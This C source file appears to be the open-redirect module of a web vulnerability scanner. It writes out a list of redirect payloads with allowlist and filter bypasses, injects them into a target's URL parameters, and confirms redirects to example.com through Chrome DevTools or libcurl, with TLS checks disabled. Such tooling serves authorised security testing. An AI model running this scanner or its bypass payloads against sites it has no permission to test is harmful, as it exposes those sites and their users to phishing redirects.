#define _DEFAULT_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <errno.h>
#include <curl/curl.h>

#include "../../chrome/chrome.h"
#include "oprt.h"

/* ============================================================================
 * Constants
 * ============================================================================ */

#define MAX_URL_LEN     32768
#define MAX_PARAM_LEN   256
#define MAX_PAYLOAD_LEN 2048
#define CHROME_PORT     9222
#define CURL_TIMEOUT    10
#define CURL_CONNECT_TIMEOUT 5

/* Canonical marker host — any redirect that lands here proves the bug. */
#define MARKER_HOST      "example.com"
#define MARKER_URL       "http://example.com/"

/* Payload template file written by generate_payloads(). */
#define PAYLOAD_FILE     "ghostquery/openredirect/payloads.txt"

/* ============================================================================
 * Small helpers (kept self-contained to avoid pulling in gq.c statics)
 * ============================================================================ */

static void strip_nl(char *s) {
    if (!s) return;
    size_t n = strlen(s);
    while (n && (s[n-1] == '\n' || s[n-1] == '\r')) s[--n] = '\0';
}

static int line_count_quick(const char *f) {
    FILE *fp = fopen(f, "r");
    if (!fp) return -1;
    int n = 0, c;
    while ((c = fgetc(fp)) != EOF) if (c == '\n') n++;
    fclose(fp);
    return n;
}

/* Same semantics as gq.c's build_param_url, but local. */
static int build_param_url(char *dst, size_t dstsz,
                           const char *url, const char *param, const char *value) {
    if (!dst || !url || !param || !value) return 0;

    const char *frag    = strchr(url, '#');
    size_t      url_len = frag ? (size_t)(frag - url) : strlen(url);
    const char *q       = memchr(url, '?', url_len);

    const char *hit = NULL, *seg_end = NULL;
    if (q) {
        size_t plen = strlen(param);
        const char *p = q + 1, *end = url + url_len;
        while (p < end) {
            const char *amp = memchr(p, '&', (size_t)(end - p));
            const char *e   = amp ? amp : end;
            if ((size_t)(e - p) > plen && p[plen] == '=' &&
                strncmp(p, param, plen) == 0) {
                hit = p; seg_end = e; break;
            }
            p = amp ? amp + 1 : end;
        }
    }

    int n;
    if (hit) {
        n = snprintf(dst, dstsz, "%.*s%s=%s%s",
                     (int)(hit - url), url, param, value, seg_end);
    } else {
        const char *sep = q ? "&" : "?";
        n = snprintf(dst, dstsz, "%.*s%s%s=%s%s",
                     (int)url_len, url, sep, param, value,
                     frag ? frag : "");
    }
    return (n >= 0 && (size_t)n < dstsz);
}

/* ============================================================================
 * Payload generation
 * ============================================================================ */

/*
 * Each payload is a URL-encoded value that, if the server redirects to
 * it naively, will land the browser on example.com. We include many known
 * bypasses for weak filters (prefix-match, substring-match, etc.).
 *
 * The `example.com` host is the ground truth — we never need to control
 * a server because example.com is guaranteed to resolve and return 200.
 */
static const char *PAYLOADS[] = {
    /* -------- direct absolute URLs -------- */
    "http://example.com/",
    "https://example.com/",
    "//example.com/",                       /* protocol-relative */
    "http:example.com/",
    "https:example.com/",
    "http:/example.com/",
    "https:/example.com/",
    "http:////example.com/",

    /* -------- @-trick: userinfo confusion -------- */
    "http://evil.com@example.com/",
    "http://example.com@evil.com/",
    "http://example.com%40evil.com/",
    "http://evil.com%40example.com/",
    "//evil.com@example.com/",

    /* -------- backslash normalization (browsers treat \ as /) -------- */
    "http:\\\\example.com/",
    "http:\\example.com/",
    "\\example.com/",
    "\\\\example.com/",
    "/\\example.com/",

    /* -------- whitespace / control-char tricks -------- */
    "http://example.com%09/",
    "http://example.com%0a/",
    "http://example.com%0d/",
    "http://example.com%20/",
    "http://example.com\t/",
    "http://example.com\n/",

    /* -------- scheme-relative & mixed-case -------- */
    "HTTP://EXAMPLE.COM/",
    "HttP://Example.Com/",
    "hTtPs://eXaMpLe.CoM/",

    /* -------- dangling scheme tricks -------- */
    "http:///example.com/",
    "http:////example.com/",
    "http://example.com./",                 /* trailing-dot FQDN */
    "http://example.com%2e/",
    "http://example.com%00.evil.com/",

    /* -------- path-relative escapes -------- */
    "/%09/example.com/",
    "/%2f%2fexample.com/",
    "/%2F%2Fexample.com/",
    "/%5cexample.com/",
    "/..%2f..%2fexample.com/",

    /* -------- prefix-based allowlist bypasses -------- */
    /* If server checks startswith("http://example.com"), these pass: */
    "http://example.com.evil.com/",
    "http://example.com@evil.com/",
    "http://example.com%2eevil.com/",
    "http://example.com#@evil.com/",
    "http://example.com?.evil.com/",
    "http://example.com/../evil.com/",

    /* -------- relative backslash (IE/Edge quirks) -------- */
    "\\/example.com/",
    "/\\/example.com/",
    "\\\\/example.com/",

    /* -------- encoded forms -------- */
    "http%3A%2F%2Fexample.com%2F",
    "http%3a%2f%2fexample.com%2f",
    "%68%74%74%70%3a%2f%2f%65%78%61%6d%70%6c%65%2e%63%6f%6d%2f",

    NULL
};

int openredirect_generate_payloads(void) {
    const char *dir = "ghostquery/openredirect";
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "mkdir -p %s 2>/dev/null", dir);
    if (system(cmd) != 0) { /* ignore */ }

    FILE *fp = fopen(PAYLOAD_FILE, "w");
    if (!fp) {
        fprintf(stderr, "[openredirect] cannot write %s\n", PAYLOAD_FILE);
        return -1;
    }
    for (int i = 0; PAYLOADS[i]; i++)
        fprintf(fp, "%s\n", PAYLOADS[i]);
    fclose(fp);

    printf("[openredirect] wrote %d payloads to %s\n",
           (int)(sizeof(PAYLOADS)/sizeof(PAYLOADS[0]) - 1), PAYLOAD_FILE);
    return 0;
}

/* ============================================================================
 * HTTP probe (fallback when Chrome is unavailable)
 * ============================================================================ */

static size_t discard_cb(char *p, size_t s, size_t n, void *u) {
    (void)p; (void)u;
    return s * n;
}

/*
 * Send `url` and inspect both the final URL (after redirects) and the
 * Location header of the *first* response. Returns:
 *    1  -> redirect to MARKER_HOST observed
 *    0  -> no redirect observed
 *   -1  -> transport error
 */
static int http_probe_open_redirect(const char *url,
                                    char *final_out, size_t final_sz,
                                    char *loc_out,   size_t loc_sz) {
    CURL *curl = curl_easy_init();
    if (!curl) return -1;

    if (final_out && final_sz) final_out[0] = '\0';
    if (loc_out   && loc_sz)   loc_out[0]   = '\0';

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);  /* we want the 3xx */
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, CURL_TIMEOUT);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, CURL_CONNECT_TIMEOUT);
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "ghostquery/1.0");
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, discard_cb);

    CURLcode rc = curl_easy_perform(curl);
    if (rc != CURLE_OK) {
        curl_easy_cleanup(curl);
        return -1;
    }

    long code = 0;
    char *loc = NULL;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);
    curl_easy_getinfo(curl, CURLINFO_REDIRECT_URL, &loc);

    if (loc && loc_out && loc_sz)
        snprintf(loc_out, loc_sz, "%s", loc);

    /* Follow manually once to see where it lands. */
    if (code >= 300 && code < 400 && loc) {
        CURL *c2 = curl_easy_init();
        if (c2) {
            curl_easy_setopt(c2, CURLOPT_URL, loc);
            curl_easy_setopt(c2, CURLOPT_FOLLOWLOCATION, 1L);
            curl_easy_setopt(c2, CURLOPT_MAXREDIRS, 5L);
            curl_easy_setopt(c2, CURLOPT_TIMEOUT, CURL_TIMEOUT);
            curl_easy_setopt(c2, CURLOPT_CONNECTTIMEOUT, CURL_CONNECT_TIMEOUT);
            curl_easy_setopt(c2, CURLOPT_NOSIGNAL, 1L);
            curl_easy_setopt(c2, CURLOPT_WRITEFUNCTION, discard_cb);
            curl_easy_setopt(c2, CURLOPT_SSL_VERIFYPEER, 0L);
            curl_easy_setopt(c2, CURLOPT_SSL_VERIFYHOST, 0L);
            if (curl_easy_perform(c2) == CURLE_OK) {
                char *final = NULL;
                curl_easy_getinfo(c2, CURLINFO_EFFECTIVE_URL, &final);
                if (final && final_out && final_sz)
                    snprintf(final_out, final_sz, "%s", final);
            }
            curl_easy_cleanup(c2);
        }
    } else if (code >= 200 && code < 300) {
        /* No redirect — effective URL is the same as the request. */
        if (final_out && final_sz)
            snprintf(final_out, final_sz, "%s", url);
    }

    curl_easy_cleanup(curl);
    return 0;
}

/* Case-insensitive host match: does `url` point at MARKER_HOST? */
static int url_host_is_marker(const char *url) {
    if (!url || !*url) return 0;

    /* Skip scheme */
    const char *p = strstr(url, "://");
    p = p ? p + 3 : url;

    /* Skip userinfo */
    const char *at = strchr(p, '@');
    if (at) p = at + 1;

    /* Compare host prefix case-insensitively */
    size_t hl = strlen(MARKER_HOST);
    for (size_t i = 0; i < hl; i++) {
        if (tolower((unsigned char)p[i]) != MARKER_HOST[i]) return 0;
    }
    /* Must be followed by '/', ':', '?', '#', or end */
    char c = p[hl];
    return (c == '\0' || c == '/' || c == ':' || c == '?' || c == '#');
}

/* ============================================================================
 * Chrome-based probe
 * ============================================================================ */

/*
 * Ask CDP for the current top-level URL.  Returns 1 if we got a URL and
 * wrote it into `out`, else 0.
 */
static int cdp_current_url(chrome *c, char *out, size_t outsz) {
    if (!c || !c->use_websocket || outsz == 0) return 0;
    out[0] = '\0';

    const char *cmd =
        "{\"id\":201,\"method\":\"Runtime.evaluate\",\"params\":{"
        "\"expression\":\"location.href\","
        "\"returnByValue\":true}}";
    size_t sent = 0;
    if (curl_ws_send(c->curl, cmd, strlen(cmd), &sent, 0, CURLWS_TEXT) != CURLE_OK)
        return 0;

    /* Drain frames until we see our id with a "result" object. */
    for (int i = 0; i < 200; i++) {
        const struct curl_ws_frame *meta = NULL;
        char buf[8192];
        size_t n = 0;
        CURLcode rc = curl_ws_recv(c->curl, buf, sizeof(buf) - 1, &n, &meta);
        if (rc == CURLE_AGAIN) { usleep(30000); continue; }
        if (rc != CURLE_OK) break;
        if (n == 0) continue;
        buf[n] = '\0';

        if (!strstr(buf, "\"id\":201")) continue;

        /* Extract "value":"..." — the string after the value key. */
        const char *v = strstr(buf, "\"value\":\"");
        if (!v) break;
        v += 9;
        const char *end = strchr(v, '"');
        if (!end) break;
        size_t len = (size_t)(end - v);
        if (len >= outsz) len = outsz - 1;
        memcpy(out, v, len);
        out[len] = '\0';
        return 1;
    }
    return 0;
}

/*
 * Navigate the current Chrome tab to `url`, wait a moment for any
 * redirects to settle, then read back location.href.
 * Returns 1 if a redirect to MARKER_HOST was observed.
 */
static int chrome_probe_open_redirect(chrome *c,
                                      const char *url,
                                      char *final_out, size_t final_sz) {
    if (final_out && final_sz) final_out[0] = '\0';
    if (!c || !c->use_websocket) return 0;

    if (navigate_to(c, url) != 0) return 0;

    /* Give Chrome time to follow any server-side redirect. */
    usleep(800000);

    char cur[2048];
    if (!cdp_current_url(c, cur, sizeof(cur))) return 0;
    if (final_out && final_sz) snprintf(final_out, final_sz, "%s", cur);

    return url_host_is_marker(cur);
}

/* ============================================================================
 * Driver
 * ============================================================================ */

/*
 * For each (param, payload) pair:
 *   1. Build a probe URL that injects payload into param.
 *   2. Send it via Chrome (preferred) or libcurl (fallback).
 *   3. If the effective/final URL points at example.com, confirm it.
 *
 * Results are appended to <path>/openredirect.txt with the format:
 *     <param> -> <payload>
 */
int openredirect_run(char *url, char *path) {
    if (!url || !path) {
        fprintf(stderr, "[openredirect] invalid arguments\n");
        return 1;
    }

    /* Ensure payload file exists. */
    if (line_count_quick(PAYLOAD_FILE) <= 0) {
        if (openredirect_generate_payloads() != 0) return 1;
    }

    char param_file[4096], out_file[4096];
    snprintf(param_file, sizeof(param_file), "%s/valid_params.txt", path);
    snprintf(out_file,   sizeof(out_file),   "%s/openredirect.txt", path);

    int nparams = line_count_quick(param_file);
    if (nparams <= 0) {
        fprintf(stderr, "[openredirect] %s is empty or missing\n", param_file);
        return 1;
    }

    FILE *pf = fopen(param_file, "r");
    if (!pf) {
        fprintf(stderr, "[openredirect] cannot read %s\n", param_file);
        return 1;
    }

    FILE *out = fopen(out_file, "a");
    if (!out) {
        fprintf(stderr, "[openredirect] cannot write %s\n", out_file);
        fclose(pf);
        return 1;
    }

    /* Try to initialize Chrome once for the whole run. */
    chrome c;
    memset(&c, 0, sizeof(c));
    int have_chrome = (init_chrome(&c, CHROME_PORT) == 0);
    if (have_chrome) printf("[openredirect] Chrome ready\n");
    else             printf("[openredirect] Chrome unavailable — using libcurl\n");

    char param[MAX_PARAM_LEN];
    char payload[MAX_PAYLOAD_LEN];
    char full_url[MAX_URL_LEN];
    int  tested = 0, confirmed = 0;

    while (fgets(param, sizeof(param), pf)) {
        strip_nl(param);
        if (param[0] == '\0' || param[0] == '#') continue;

        FILE *pl = fopen(PAYLOAD_FILE, "r");
        if (!pl) break;

        while (fgets(payload, sizeof(payload), pl)) {
            strip_nl(payload);
            if (payload[0] == '\0' || payload[0] == '#') continue;

            char *enc = curl_easy_escape(NULL, payload, 0);
            if (!enc) continue;

            if (!build_param_url(full_url, sizeof(full_url),
                                 url, param, enc)) {
                curl_free(enc);
                continue;
            }
            curl_free(enc);

            tested++;

            char final_url[2048] = {0};
            char loc_hdr[2048]   = {0};
            int  hit = 0;

            if (have_chrome) {
                hit = chrome_probe_open_redirect(&c, full_url,
                                                 final_url, sizeof(final_url));
            } else {
                if (http_probe_open_redirect(full_url,
                                             final_url, sizeof(final_url),
                                             loc_hdr, sizeof(loc_hdr)) == 0) {
                    hit = url_host_is_marker(final_url) ||
                          url_host_is_marker(loc_hdr);
                }
            }

            if (hit) {
                fprintf(out, "%s -> %s\n", param, payload);
                fflush(out);
                confirmed++;
                printf("[openredirect] *** CONFIRMED %s=%s  ->  %s ***\n",
                       param, payload,
                       final_url[0] ? final_url : loc_hdr);
            } else {
                printf("[openredirect] no redirect: %s=%s\n", param, payload);
            }
        }
        fclose(pl);
    }

    fclose(pf);
    fclose(out);
    if (have_chrome) close_chrome(&c);

    printf("[openredirect] Done. Tested %d, confirmed %d. Results: %s\n",
           tested, confirmed, out_file);
    return 0;
}